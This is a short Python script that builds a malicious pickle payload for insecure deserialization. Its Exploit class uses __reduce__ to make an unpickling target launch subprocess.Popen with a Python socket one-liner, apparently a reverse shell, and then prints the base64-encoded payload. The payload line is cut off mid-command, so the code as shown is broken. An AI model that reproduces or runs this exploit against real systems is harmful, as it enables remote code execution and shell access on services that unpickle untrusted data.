import subprocess
import pickle
import base64
# Exploit that we want the target to unpickle
class Exploit(object):
        def __reduce__(self):
                return (subprocess.Popen, (('python', '-c', 'import socket,subprocess   ,os;s=socket.socket(socket.AF_INET,socket.SOCK_STR$
shellcode =base64.b64encode(pickle.dumps(Exploit()))
print(shellcode)
